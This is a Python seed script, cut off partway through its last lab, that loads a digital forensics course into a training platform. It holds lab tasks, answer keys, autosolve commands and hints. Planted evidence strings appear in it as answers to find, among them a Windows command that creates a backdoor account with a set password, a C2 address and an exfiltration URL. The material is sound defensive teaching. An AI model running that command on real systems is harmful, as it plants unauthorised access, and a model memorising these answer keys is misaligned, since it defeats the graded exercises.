"""
seed_df_course.py — Seeds the full Digital Forensics course into the database.

Run from the cyberarcade-backend directory:
    python seed_df_course.py           # skip if course already exists
    python seed_df_course.py --force   # delete existing course and re-seed
"""
import asyncio
import sys
import os

# Add the project root to sys.path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sqlalchemy import select
from app.core.database import async_session
from app.models.course import Course
from app.models.lab import Lab, LabTask, Hint
from app.models.user import User

# ── Course metadata ────────────────────────────────────────────────────────────

COURSE_TITLE = "Digital Forensics"

COURSE = {
    "title": COURSE_TITLE,
    "description": (
        "Master digital forensics from foundations to advanced investigation techniques. "
        "Covering evidence preservation, hidden data discovery, memory forensics, deleted file "
        "recovery, steganography, and malware persistence analysis — all using Kali Linux tools "
        "in an isolated Docker environment. [SEED-DATA]"
    ),
    "difficulty_level": "intermediate",
    "category": "Digital Forensics",
    "estimated_hours": 16.0,
    "is_published": True,
}

# ── Lab definitions ────────────────────────────────────────────────────────────
# Each lab: title, description, difficulty, runtime_slug (None = theory only),
#           has_auto_solve, sort_order, and tasks list.
# Each task: title, instructions, expected_answer, autosolve_commands, hints list.
# Hints: list of strings (delay_minutes=0 for all DF hints).

LABS = [
    # ────────────────────────────────────────────────────────────────────────────
    # Lab 0 — Foundations (theory only, no terminal)
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 0 - Digital Forensics Foundations",
        "description": "Introduction to digital forensics concepts, evidence preservation, and key terminology.",
        "difficulty": "beginner",
        "runtime_slug": None,
        "has_auto_solve": False,
        "sort_order": 0,
        "tasks": [
            {
                "title": "Task 1 - Define Digital Forensics",
                "instructions": "What is digital forensics?",
                "expected_answer": "Digital forensics is the process of identifying, preserving, analyzing, and presenting digital evidence.",
                "autosolve_commands": [],
                "hints": [
                    "Think about investigation, not only hacking.",
                    "The evidence may come from computers, USB drives, phones, or memory.",
                    "Use the words: identify, preserve, analyze, present.",
                ],
            },
            {
                "title": "Task 2 - Evidence Preservation",
                "instructions": "Why should investigators avoid changing the original evidence?",
                "expected_answer": "Changing original evidence can affect integrity, timestamps, metadata, and legal reliability.",
                "autosolve_commands": [],
                "hints": [
                    "Evidence must remain trustworthy.",
                    "Even opening a file may change metadata.",
                    "Investigators usually analyze a copy or forensic image.",
                ],
            },
            {
                "title": "Task 3 - Volatile vs Non-Volatile Evidence",
                "instructions": "Give one example of volatile evidence and one example of non-volatile evidence.",
                "expected_answer": "Volatile: RAM, running processes, network connections. Non-volatile: hard disk, USB drive, SSD files.",
                "autosolve_commands": [],
                "hints": [
                    "Volatile evidence disappears after shutdown.",
                    "Non-volatile evidence remains after power off.",
                    "RAM is volatile; disk storage is non-volatile.",
                ],
            },
            {
                "title": "Task 4 - Forensic Image",
                "instructions": "What is a forensic disk image?",
                "expected_answer": "A forensic image is a bit-by-bit copy of a storage device used for analysis while preserving the original evidence.",
                "autosolve_commands": [],
                "hints": [
                    "It is more than copying visible files.",
                    "It may include deleted data and file system structure.",
                    "Investigators hash the image to verify integrity.",
                ],
            },
            {
                "title": "Task 5 - Trick Question: Mounting Evidence",
                "instructions": (
                    "An investigator mounts the original USB normally and opens files to "
                    "\"quickly check them.\" Is this good practice? Explain why."
                ),
                "expected_answer": "No. Mounting normally may modify access times, metadata, or file system state. Evidence should be mounted read-only or imaged first.",
                "autosolve_commands": [],
                "hints": [
                    "Think about metadata changes.",
                    "Opening files can change access timestamps.",
                    "Use read-only access or analyze a forensic image.",
                ],
            },
            {
                "title": "Task 6 - Trick Question: Timestamps",
                "instructions": "A file timestamp says it was modified in 2035. Should the investigator automatically trust this timestamp? Explain.",
                "expected_answer": "No. Timestamps can be manipulated using anti-forensic techniques such as touch or system time changes.",
                "autosolve_commands": [],
                "hints": [
                    "Timestamps can be fake.",
                    "Anti-forensics may manipulate file metadata.",
                    "Compare timestamps with other evidence before trusting them.",
                ],
            },
        ],
    },

    # ────────────────────────────────────────────────────────────────────────────
    # Lab 1 — USB Acquisition, Integrity, and Evidence Search
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 1 - USB Acquisition and Evidence Search",
        "description": "Learn to search for files recursively, filter by size and date, and locate hidden evidence in a Kali Linux environment.",
        "difficulty": "beginner",
        "runtime_slug": "df-kali",
        "has_auto_solve": True,
        "sort_order": 1,
        "tasks": [
            {
                "title": "Task 1 - Recursive Directory Listing",
                "instructions": "What is the Linux command used to list files and directories recursively?",
                "expected_answer": "ls -R",
                "autosolve_commands": ["cd ~ && ls -R labs/evidence-search"],
                "hints": [
                    "Use a command that displays directory contents.",
                    "Add an option that enables recursive listing.",
                    "The recursive option uses a capital letter.",
                ],
            },
            {
                "title": "Task 2 - Recursive Text Search",
                "instructions": "What is the Linux command used to search recursively for text inside files?",
                "expected_answer": 'grep -Ri "text" .',
                "autosolve_commands": ["cd ~/labs/evidence-search && grep -Ri 'password' ."],
                "hints": [
                    "Use a command designed for searching text patterns.",
                    "Add an option for recursive searching through directories.",
                    "Another option can make the search case-insensitive.",
                ],
            },
            {
                "title": "Task 3 - Find Files by Size",
                "instructions": "What is the Linux command used to find files larger than a specific size?",
                "expected_answer": "find . -type f -size +10M",
                "autosolve_commands": ["cd ~ && find . -type f -size +10M"],
                "hints": [
                    "Use a command that searches for files and directories.",
                    "Restrict the search to regular files only.",
                    "Use the -size option to filter results.",
                ],
            },
            {
                "title": "Task 4 - Display File Contents",
                "instructions": "What is the Linux command used to display the contents of a file?",
                "expected_answer": "cat filename",
                "autosolve_commands": ["cd ~/labs/evidence-search && cat suspicious.txt"],
                "hints": [
                    "Use a command that prints file contents to the terminal.",
                    "The command is commonly used for viewing text files quickly.",
                    "Add the filename after the command.",
                ],
            },
            {
                "title": "Task 5 - Evidence: Large Files",
                "instructions": "From the home directory, run the size search. Which files larger than 10MB appear? (List all paths, one per line)",
                "expected_answer": "./labs/evidence-search/large_file.bin\n./labs/diskimage/evidence.dd",
                "autosolve_commands": ["cd ~ && find . -type f -size +10M"],
                "hints": [
                    "Start from the home directory using cd ~.",
                    "Search only regular files with find . -type f.",
                    "Filter for files larger than 10MB with -size +10M.",
                ],
            },
            {
                "title": "Task 6 - Evidence: Recently Modified File",
                "instructions": "In ~/labs/evidence-search, which file appears when you search for files modified within the last day?",
                "expected_answer": "./recent_activity.log",
                "autosolve_commands": ["cd ~/labs/evidence-search && find . -type f -mtime -1"],
                "hints": [
                    "Move into the evidence-search folder first.",
                    "Use find . -type f to search only regular files.",
                    "Use the modification-time filter -mtime -1.",
                ],
            },
            {
                "title": "Task 7 - Find Password Evidence",
                "instructions": "In ~/labs/evidence-search, what password value is found in suspicious.txt?",
                "expected_answer": "password=admin123",
                "autosolve_commands": ["grep -h 'password=' ~/labs/evidence-search/suspicious.txt"],
                "hints": [
                    "Move into the evidence-search folder first.",
                    "Search recursively and case-insensitively with grep -Ri.",
                    "Search for the word password and read the matching line.",
                ],
            },
            {
                "title": "Task 8 - Find Suspicious Permissions",
                "instructions": "In ~/labs/evidence-search, which file has 777 permissions?",
                "expected_answer": "./suspicious.txt",
                "autosolve_commands": ["cd ~/labs/evidence-search && find . -type f -perm 777"],
                "hints": [
                    "Move into the evidence-search folder first.",
                    "Use find . -type f to search only regular files.",
                    "Use -perm 777 to filter by permissions.",
                ],
            },
            {
                "title": "Task 9 - Evidence: Text Files",
                "instructions": "In ~/labs/evidence-search, which files appear when you search for .txt files case-insensitively? (List all paths, sorted)",
                "expected_answer": "./documents/meeting_notes.TXT\n./reports/q1_report.txt\n./reports/q2_report.txt\n./suspicious.txt",
                "autosolve_commands": ['cd ~/labs/evidence-search && find . -iname "*.txt" | sort'],
                "hints": [
                    "Move into the evidence-search folder first.",
                    "Use find . with the case-insensitive name option.",
                    'Search for the pattern "*.txt".',
                ],
            },
        ],
    },

    # ────────────────────────────────────────────────────────────────────────────
    # Lab 2 — Hidden Data and Anti-Forensics
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 2 - Hidden Data and Anti-Forensics",
        "description": "Identify hidden files, detect disguised file types using the file command, inspect metadata, and uncover manipulated timestamps.",
        "difficulty": "intermediate",
        "runtime_slug": "df-kali",
        "has_auto_solve": True,
        "sort_order": 2,
        "tasks": [
            {
                "title": "Task 1 - Command: Show Only Hidden Files",
                "instructions": "Which Linux command displays only hidden files in the current directory (files starting with a dot)?",
                "expected_answer": "ls -d .*",
                "autosolve_commands": [],
                "hints": [
                    "Hidden files in Linux start with a dot (.).",
                    "Use the ls command.",
                    "Use an option that matches patterns instead of listing everything.",
                ],
            },
            {
                "title": "Task 2 - Command: Identify Real File Types",
                "instructions": "Which command checks the real type of every visible file?",
                "expected_answer": "file *",
                "autosolve_commands": [],
                "hints": [
                    "Do not trust file extensions.",
                    "Use the file command with a wildcard.",
                    "The answer is a command.",
                ],
            },
            {
                "title": "Task 3 - Command: List ZIP Contents",
                "instructions": "Which command lists the contents of budget.docx without extracting it?",
                "expected_answer": "unzip -l budget.docx",
                "autosolve_commands": [],
                "hints": [
                    "The file may actually be a ZIP archive.",
                    "Use unzip with the listing option.",
                    "The answer is a command.",
                ],
            },
            {
                "title": "Task 4 - Command: Inspect Metadata",
                "instructions": "Which command displays timestamps and metadata for all visible files?",
                "expected_answer": "stat *",
                "autosolve_commands": [],
                "hints": [
                    "Use the metadata inspection command.",
                    "Use it with a wildcard.",
                    "The answer is a command.",
                ],
            },
            {
                "title": "Task 5 - Evidence: Hidden File Identification",
                "instructions": "Navigate to ~/labs/hidden-data. Which hidden file exists in this directory?",
                "expected_answer": ".hidden_config.txt",
                "autosolve_commands": ["find ~/labs/hidden-data -maxdepth 1 -name '.*' ! -name '.' ! -name '..' -printf '%f\\n'"],
                "hints": [
                    "First, use the command that lists directory contents: ls",
                    "Then modify it with a flag that allows matching patterns: ls -d",
                    "Use a wildcard pattern to target hidden files (files starting with a dot): .*",
                ],
            },
            {
                "title": "Task 6 - Evidence: Disguised File Type",
                "instructions": "What is the real file type of budget.docx?",
                "expected_answer": "Zip archive data",
                "autosolve_commands": ["file ~/labs/hidden-data/budget.docx | cut -d: -f2- | xargs | cut -d, -f1"],
                "hints": [
                    "Run: file *",
                    "Do not answer with the extension.",
                    "Look at the type shown for budget.docx.",
                ],
            },
            {
                "title": "Task 7 - Evidence: Archive Contents",
                "instructions": "Which two files are inside budget.docx?",
                "expected_answer": "salary_data.csv and confidential_deals.txt",
                "autosolve_commands": ["cd ~/labs/hidden-data && unzip -l budget.docx"],
                "hints": [
                    "Run: unzip -l budget.docx",
                    "Read the file names in the archive listing.",
                    "There are two files.",
                ],
            },
            {
                "title": "Task 8 - Evidence: Sensitive Password",
                "instructions": "What archive password is found in Sensitive_Data.txt?",
                "expected_answer": "forensics2024",
                "autosolve_commands": ["grep 'Password for archive:' ~/labs/hidden-data/Sensitive_Data.txt | awk '{print $NF}'"],
                "hints": [
                    "Use grep for password or cat the sensitive file.",
                    "Read the line that says Password for archive.",
                    "Answer with the password value.",
                ],
            },
            {
                "title": "Task 9 - Evidence: Manipulated Timestamp",
                "instructions": "Which file has a suspicious old timestamp from 2020?",
                "expected_answer": "Sensitive_Data.txt",
                "autosolve_commands": ["cd ~/labs/hidden-data && stat *"],
                "hints": [
                    "Run: stat *",
                    "Compare the visible file timestamps.",
                    "Look for the file dated 2020.",
                ],
            },
        ],
    },

    # ────────────────────────────────────────────────────────────────────────────
    # Lab 3 — Linux Regex and Artifact Extraction
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 3 - Linux Regex and Artifact Extraction",
        "description": "Use grep with regular expressions to extract emails, IP addresses, URLs, phone numbers, and MAC addresses from evidence files.",
        "difficulty": "intermediate",
        "runtime_slug": "df-kali",
        "has_auto_solve": True,
        "sort_order": 3,
        "tasks": [
            {
                "title": "Task 1 - Command: Extract Emails",
                "instructions": "Which command extracts email addresses from evidence.txt?",
                "expected_answer": "grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}' evidence.txt",
                "autosolve_commands": [],
                "hints": [
                    "Use grep -Eo for regex searching",
                    "Match the email username part before @ using [A-Za-z0-9._%+-]+@",
                    "Match full domain format using [A-Za-z0-9.-]+\\.[A-Za-z]{2,}",
                ],
            },
            {
                "title": "Task 2 - Command: Extract IPv4 Addresses",
                "instructions": "Which command extracts IPv4 addresses from evidence.txt?",
                "expected_answer": "grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' evidence.txt",
                "autosolve_commands": [],
                "hints": [
                    "Use grep -Eo for regex extraction",
                    "IPv4 consists of four numeric octets separated by dots",
                    "Use ([0-9]{1,3}\\.){3}[0-9]{1,3} to match full IPv4 format",
                ],
            },
            {
                "title": "Task 3 - Command: Extract URLs",
                "instructions": "Which command extracts HTTP and HTTPS URLs from evidence.txt?",
                "expected_answer": "grep -Eo 'https?://[^ ]+' evidence.txt",
                "autosolve_commands": [],
                "hints": [
                    "Use grep -Eo for pattern matching",
                    "URLs start with http or https so use https?://",
                    "Match everything until a space using [^ ]+",
                ],
            },
            {
                "title": "Task 4 - Command: Extract Egyptian Phone Numbers",
                "instructions": "Which command extracts Egyptian mobile numbers from evidence.txt?",
                "expected_answer": "grep -Eo '01[0125][0-9]{8}' evidence.txt",
                "autosolve_commands": [],
                "hints": [
                    "Use grep -Eo for regex extraction",
                    "Egyptian numbers start with 010, 011, 012, or 015 using 01[0125]",
                    "Followed by 8 digits using [0-9]{8}",
                ],
            },
            {
                "title": "Task 5 - Evidence: Primary Suspect Email",
                "instructions": "Go to ~/labs/regex. What is the primary suspect email? (The first email extracted from evidence.txt)",
                "expected_answer": "john.smith@acmecorp.com",
                "autosolve_commands": [
                    "cd ~/labs/regex && grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}' evidence.txt | head -n 1"
                ],
                "hints": [
                    "First navigate to the correct directory using cd ~/labs/regex",
                    "Extract emails using grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}' evidence.txt",
                    "Get the first result using | head -n 1",
                ],
            },
            {
                "title": "Task 6 - Evidence: Malware C2 IP",
                "instructions": "What IP address is labeled as the Malware C2 server?",
                "expected_answer": "203.0.113.45",
                "autosolve_commands": [
                    "cd ~/labs/regex && grep 'Malware C2 server' evidence.txt | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'"
                ],
                "hints": [
                    "Search the line using grep \"Malware C2 server\" evidence.txt",
                    "Extract the IP using grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'",
                    "Combine both to isolate the IP address",
                ],
            },
            {
                "title": "Task 7 - Evidence: Exfiltration URL",
                "instructions": "What URL is used for the data exfiltration attempt?",
                "expected_answer": "https://evil-c2.darkweb.io/upload",
                "autosolve_commands": [
                    "grep 'exfiltration' ~/labs/regex/evidence.txt | grep -Eo 'https?://[^ ]+'"
                ],
                "hints": [
                    "Extract URLs using grep -Eo 'https?://[^ ]+' evidence.txt",
                    "Look for the line mentioning data exfiltration attempt",
                    "Identify the full URL from the output",
                ],
            },
            {
                "title": "Task 8 - Evidence: Burner Phone",
                "instructions": "What burner phone number is listed in evidence.txt?",
                "expected_answer": "01523456789",
                "autosolve_commands": [
                    "grep -i 'Burner phone' ~/labs/regex/evidence.txt | grep -Eo '01[0125][0-9]{8}'"
                ],
                "hints": [
                    "Navigate to ~/labs/regex first using cd ~/labs/regex",
                    "Extract Egyptian numbers using grep -Eo '01[0125][0-9]{8}' evidence.txt",
                    "The output is the answer",
                ],
            },
            {
                "title": "Task 9 - Evidence: USB WiFi Adapter MAC",
                "instructions": "What MAC address belongs to the USB WiFi adapter?",
                "expected_answer": "DE:AD:BE:EF:CA:FE",
                "autosolve_commands": [
                    "cd ~/labs/regex && grep -i 'USB WiFi adapter' evidence.txt | grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}'"
                ],
                "hints": [
                    "Navigate to ~/labs/regex first using cd ~/labs/regex",
                    "Extract MAC addresses using grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' evidence.txt",
                    "The output is the answer",
                ],
            },
        ],
    },

    # ────────────────────────────────────────────────────────────────────────────
    # Lab 4 — Memory Forensics Basics
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 4 - Memory Forensics Basics",
        "description": "Analyze a memory image to uncover running processes, network connections, backdoor commands, registry persistence, and passwords.",
        "difficulty": "intermediate",
        "runtime_slug": "df-kali",
        "has_auto_solve": True,
        "sort_order": 4,
        "tasks": [
            {
                "title": "Task 1 - Command: Memory Image Information",
                "instructions": "Which command is used to identify operating system information from memory.raw?",
                "expected_answer": "volatility -f memory.raw imageinfo",
                "autosolve_commands": [],
                "hints": [
                    "Start with volatility -f memory.raw",
                    "Use the plugin that identifies memory profile information",
                    "The plugin name is imageinfo",
                ],
            },
            {
                "title": "Task 2 - Command: List Processes",
                "instructions": "Which command displays running processes from memory.raw?",
                "expected_answer": "volatility -f memory.raw pslist",
                "autosolve_commands": [],
                "hints": [
                    "Start with volatility -f memory.raw",
                    "Use the plugin that lists running processes",
                    "The plugin name is pslist",
                ],
            },
            {
                "title": "Task 3 - Command: Process Tree",
                "instructions": "Which command shows parent-child process relationships from memory.raw?",
                "expected_answer": "volatility -f memory.raw pstree",
                "autosolve_commands": [],
                "hints": [
                    "Start with volatility -f memory.raw",
                    "Use the plugin that displays process hierarchy",
                    "The plugin name is pstree",
                ],
            },
            {
                "title": "Task 4 - Command: Network Connections",
                "instructions": "Which command displays network connections from memory.raw?",
                "expected_answer": "volatility -f memory.raw netscan",
                "autosolve_commands": [],
                "hints": [
                    "Start with volatility -f memory.raw",
                    "Use the plugin that scans network connections",
                    "The plugin name is netscan",
                ],
            },
            {
                "title": "Task 5 - Evidence: Suspicious PowerShell PID",
                "instructions": "Go to ~/labs/memory. What PID is shown for powershell.exe in memory.raw?",
                "expected_answer": "2048",
                "autosolve_commands": [
                    "strings ~/labs/memory/memory.raw | grep -i 'powershell.exe' | grep -Eo 'PID:[0-9]+' | grep -Eo '[0-9]+'"
                ],
                "hints": [
                    "Navigate using cd ~/labs/memory",
                    "Extract readable strings using strings memory.raw",
                    "Search for PowerShell using grep -i powershell",
                ],
            },
            {
                "title": "Task 6 - Evidence: External HTTPS Connection",
                "instructions": "Which external IP is connected on port 443?",
                "expected_answer": "45.33.32.156",
                "autosolve_commands": [
                    "strings ~/labs/memory/memory.raw | grep 'NETWORK:' | grep ':443 ESTABLISHED' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' | tail -1"
                ],
                "hints": [
                    "Extract readable strings using strings memory.raw",
                    "Search for network activity using grep NETWORK",
                    "Look for a connection ending with :443 ESTABLISHED",
                ],
            },
            {
                "title": "Task 7 - Evidence: Backdoor Command",
                "instructions": "Which command creates a backdoor user?",
                "expected_answer": "cmd.exe /c net user backdoor P@ssw0rd /add",
                "autosolve_commands": [
                    "strings ~/labs/memory/memory.raw | grep 'CMD:' | grep 'net user' | sed 's/^CMD: //'"
                ],
                "hints": [
                    "Extract readable strings using strings memory.raw",
                    "Search for Windows account commands using grep -i 'net user'",
                    "Read the full suspicious command line",
                ],
            },
            {
                "title": "Task 8 - Evidence: Registry Persistence",
                "instructions": "Which Run-key executable path is shown in memory.raw?",
                "expected_answer": "C:\\Users\\student\\AppData\\malware.exe",
                "autosolve_commands": [
                    "strings ~/labs/memory/memory.raw | grep 'REG:' | grep -o 'C:\\\\.*\\.exe'"
                ],
                "hints": [
                    "Extract readable strings using strings memory.raw",
                    "Search for registry Run keys using grep -i 'CurrentVersion\\Run'",
                    "Look for the executable path linked to persistence",
                ],
            },
            {
                "title": "Task 9 - Evidence: Password String",
                "instructions": "Which password value is found in memory.raw?",
                "expected_answer": "admin123",
                "autosolve_commands": [
                    "strings ~/labs/memory/memory.raw | grep 'STR:' | grep 'password=' | head -1 | grep -Eo 'password=[^ ]*' | cut -d= -f2"
                ],
                "hints": [
                    "Extract readable strings using strings memory.raw",
                    "Search for password values using grep -i password",
                    "Look for the value after password=",
                ],
            },
        ],
    },

    # ────────────────────────────────────────────────────────────────────────────
    # Lab 5 — Deleted File Recovery with Sleuth Kit
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 5 - Deleted File Recovery with Sleuth Kit",
        "description": "Use fls, istat, and icat from The Sleuth Kit to find deleted files, inspect inode metadata, and recover deleted evidence.",
        "difficulty": "intermediate",
        "runtime_slug": "df-kali",
        "has_auto_solve": True,
        "sort_order": 5,
        "tasks": [
            {
                "title": "Task 1 - Command: Partition Layout",
                "instructions": "Which command displays partition information from evidence.dd?",
                "expected_answer": "mmls evidence.dd",
                "autosolve_commands": [],
                "hints": [
                    "Use the Sleuth Kit partition analysis tool mmls",
                    "Add the disk image name evidence.dd",
                    "The command displays volume and partition layout information",
                ],
            },
            {
                "title": "Task 2 - Command: File System Information",
                "instructions": "Which command displays file system statistics and metadata from evidence.dd?",
                "expected_answer": "fsstat evidence.dd",
                "autosolve_commands": [],
                "hints": [
                    "Use the Sleuth Kit file system statistics tool fsstat",
                    "Add the disk image name evidence.dd",
                    "The command shows file system type, block size, and layout details",
                ],
            },
            {
                "title": "Task 3 - Command: Deleted Files Only",
                "instructions": "Which command displays deleted files only from evidence.dd?",
                "expected_answer": "fls -rd evidence.dd",
                "autosolve_commands": [],
                "hints": [
                    "Use the file listing tool fls",
                    "Add the deleted-files flag -d",
                    "Combine it with recursive listing using -r",
                ],
            },
            {
                "title": "Task 4 - Command: Inode Metadata",
                "instructions": "Which command displays metadata for inode 18 in evidence.dd?",
                "expected_answer": "istat evidence.dd 18",
                "autosolve_commands": [],
                "hints": [
                    "Use the inode statistics tool istat",
                    "Add the image name evidence.dd",
                    "Specify inode number 18 at the end of the command",
                ],
            },
            {
                "title": "Task 5 - Evidence: Deleted File Name",
                "instructions": "Go to ~/labs/diskimage. Which deleted file is shown by fls -rd evidence.dd?",
                "expected_answer": "evidence.txt",
                "autosolve_commands": ["fls -rd ~/labs/diskimage/evidence.dd | awk '{print $NF}'"],
                "hints": [
                    "Navigate using cd ~/labs/diskimage",
                    "List deleted files recursively using fls -rd evidence.dd",
                    "Read the deleted filename from the output",
                ],
            },
            {
                "title": "Task 6 - Evidence: Deleted File Inode",
                "instructions": "What inode number is shown for the deleted evidence.txt file?",
                "expected_answer": "18",
                "autosolve_commands": ["fls -rd ~/labs/diskimage/evidence.dd | awk '{gsub(\":\",\"\",$3); print $3}'"],
                "hints": [
                    "Run fls -rd evidence.dd",
                    "Look at the number displayed before the filename",
                    "Identify the inode associated with evidence.txt",
                ],
            },
            {
                "title": "Task 7 - Evidence: Allocation Status",
                "instructions": "According to istat evidence.dd 18, is the inode allocated or not allocated?",
                "expected_answer": "Not Allocated",
                "autosolve_commands": ["istat ~/labs/diskimage/evidence.dd 18 | grep -i 'Allocated'"],
                "hints": [
                    "Display inode metadata using istat evidence.dd 18",
                    "Look near the top of the output for allocation details",
                    "Read the inode status value",
                ],
            },
            {
                "title": "Task 8 - Evidence: Recover Deleted File",
                "instructions": "Recover the deleted file using icat evidence.dd 18 > recovered.txt. What case number is found inside?",
                "expected_answer": "2024-1547",
                "autosolve_commands": [
                    "icat ~/labs/diskimage/evidence.dd 18 | grep 'CASE #' | grep -Eo '[0-9]+-[0-9]+'"
                ],
                "hints": [
                    "Recover the file using icat evidence.dd 18 > recovered.txt",
                    "Read the recovered file using cat recovered.txt",
                    "Look for the CASE # value near the top",
                ],
            },
            {
                "title": "Task 9 - Evidence: Offshore Account",
                "instructions": "What offshore account number is found in the recovered file?",
                "expected_answer": "CH-9300762011623852957",
                "autosolve_commands": [
                    "icat ~/labs/diskimage/evidence.dd 18 | grep -Eo 'CH-[0-9]+'"
                ],
                "hints": [
                    "Read the recovered file using cat recovered.txt",
                    "Look for the line starting with Transferred",
                    "Answer with the account number after the colon",
                ],
            },
        ],
    },

    # ────────────────────────────────────────────────────────────────────────────
    # Lab 6 — Steganography and Metadata Analysis
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 6 - Steganography and Metadata Analysis",
        "description": "Use steghide and exiftool to uncover hidden data embedded in image files and detect disguised file types through metadata inspection.",
        "difficulty": "advanced",
        "runtime_slug": "df-kali",
        "has_auto_solve": True,
        "sort_order": 6,
        "tasks": [
            {
                "title": "Task 1 - Command: Check for Hidden Data",
                "instructions": "Which command checks if company_logo.bmp contains hidden embedded data?",
                "expected_answer": "steghide info company_logo.bmp",
                "autosolve_commands": [],
                "hints": [
                    "Use steghide with the info flag",
                    "Specify the image file directly after the info flag (no -sf)",
                    "The command reveals capacity and the embedded filename",
                ],
            },
            {
                "title": "Task 2 - Command: Extract Hidden Data",
                "instructions": 'Which command extracts hidden data from company_logo.bmp using the passphrase forensics?',
                "expected_answer": 'steghide extract -sf company_logo.bmp -p "forensics"',
                "autosolve_commands": [],
                "hints": [
                    "Use steghide with the extract flag",
                    'Use -sf for the image file and -p "forensics" for the passphrase',
                    "The command writes the embedded file to the current directory",
                ],
            },
            {
                "title": "Task 3 - Command: Read EXIF Metadata",
                "instructions": "Which command reads all EXIF metadata from company_logo.jpg?",
                "expected_answer": "exiftool company_logo.jpg",
                "autosolve_commands": [],
                "hints": [
                    "Use the exiftool metadata reader",
                    "Apply it directly to company_logo.jpg",
                    "The command shows timestamps, software, and image properties",
                ],
            },
            {
                "title": "Task 4 - Command: Extract File Type Metadata",
                "instructions": "Which command extracts only the FileType metadata field from financial_report.docx?",
                "expected_answer": "exiftool -FileType financial_report.docx",
                "autosolve_commands": [],
                "hints": [
                    "Use exiftool with a specific field flag",
                    "Use -FileType to request only the file type field",
                    "Apply it to financial_report.docx",
                ],
            },
            {
                "title": "Task 5 - Evidence: Embedded Filename",
                "instructions": "Go to ~/labs/insider. Run steghide info company_logo.bmp. What is the embedded filename?",
                "expected_answer": "hidden_evidence.txt",
                "autosolve_commands": [
                    "cd ~/labs/insider",
                    "steghide info -p 'forensics' company_logo.bmp",
                ],
                "hints": [
                    "Navigate using cd ~/labs/insider",
                    "Run steghide info company_logo.bmp",
                    "Look for the embedded file name in the output",
                ],
            },
            {
                "title": "Task 6 - Evidence: USB Serial Number",
                "instructions": "Extract the hidden data from company_logo.bmp. What USB serial number is mentioned?",
                "expected_answer": "USB-202401-INSIDER",
                "autosolve_commands": [
                    'steghide extract -sf company_logo.bmp -p "forensics"',
                    "cat hidden_evidence.txt",
                ],
                "hints": [
                    "Extract with steghide extract -sf company_logo.bmp -p \"forensics\"",
                    "Read the extracted file using cat hidden_evidence.txt",
                    "Look for the Destination USB serial line",
                ],
            },
            {
                "title": "Task 7 - Evidence: Contact Email",
                "instructions": "What contact email is listed in the hidden evidence file?",
                "expected_answer": "personal_email@gmail.com",
                "autosolve_commands": ["cat hidden_evidence.txt"],
                "hints": [
                    "Read the extracted file using cat hidden_evidence.txt",
                    "Look for the Contact email used line",
                    "Answer with the full email address",
                ],
            },
            {
                "title": "Task 8 - Evidence: Files Copied to USB",
                "instructions": "How many confidential files were copied to USB according to the hidden data?",
                "expected_answer": "47",
                "autosolve_commands": [
                    "cat hidden_evidence.txt | grep -i copied",
                ],
                "hints": [
                    "Read the extracted file using cat hidden_evidence.txt",
                    "Look for the line starting with Employee copied",
                    "Answer with the number of files",
                ],
            },
            {
                "title": "Task 9 - Evidence: Disguised File Type",
                "instructions": "Run exiftool -FileType financial_report.docx. What file type does it report?",
                "expected_answer": "ZIP",
                "autosolve_commands": [
                    "exiftool -FileType financial_report.docx",
                ],
                "hints": [
                    "Run exiftool -FileType financial_report.docx",
                    "The extension says .docx but exiftool reads the real format",
                    "Answer with the file type value shown",
                ],
            },
        ],
    },

    # ────────────────────────────────────────────────────────────────────────────
    # Lab 7 — Malware Persistence Analysis
    # ────────────────────────────────────────────────────────────────────────────
    {
        "title": "Lab 7 - Malware Persistence Analysis",
        "description": "Investigate malware persistence mechanisms: malicious cron jobs, Base64-encoded payloads, backdoor accounts, and suspicious SSH logins.",
        "difficulty": "advanced",
        "runtime_slug": "df-kali",
        "has_auto_solve": True,
        "sort_order": 7,
        "tasks": [
            {
                "title": "Task 1 - Command: List Cron Jobs",
                "instructions": "Which command lists the current user's scheduled cron jobs?",
                "expected_answer": "crontab -l",
                "autosolve_commands": [],
                "hints": [
                    "Use the Linux scheduled-task utility crontab",
                    "Add the list flag -l",
                    "The command displays scheduled cron entries for the current user",
                ],
            },
            {
                "title": "Task 2 - Command: Decode Base64 File",
                "instructions": "Which command decodes the Base64-encoded file encoded_payload.txt?",
                "expected_answer": "base64 -d encoded_payload.txt",
                "autosolve_commands": [],
                "hints": [
                    "Use the Linux decoding utility base64",
                    "Add the decode flag -d",
                    "Apply the command to encoded_payload.txt",
                ],
            },
            {
                "title": "Task 3 - Command: Find Shell Users",
                "instructions": "Which command lists users in /etc/passwd that have a real shell (not nologin)?",
                "expected_answer": "cat /etc/passwd | grep -v nologin",
                "autosolve_commands": [],
                "hints": [
                    "Display the passwd file using cat /etc/passwd",
                    "Pipe the output into grep -v nologin",
                    "The command excludes accounts without shell access",
                ],
            },
            {
                "title": "Task 4 - Command: Find Successful SSH Logins",
                "instructions": "Which command finds successful SSH login lines in auth.log?",
                "expected_answer": "grep \"Accepted\" auth.log",
                "autosolve_commands": [],
                "hints": [
                    "Use the Linux text-search utility grep",
                    "Search for the keyword Accepted",
                    "Apply the search to auth.log",
                ],
            },
            {
                "title": "Task 5 - Evidence: Cron Backdoor Script",
                "instructions": "Go to ~/labs/malware. What script path is scheduled in the malicious cron job?",
                "expected_answer": "/tmp/.x/beacon.sh",
                "autosolve_commands": ["cd ~/labs/malware", "crontab -l"],
                "hints": [
                    "Navigate using cd ~/labs/malware",
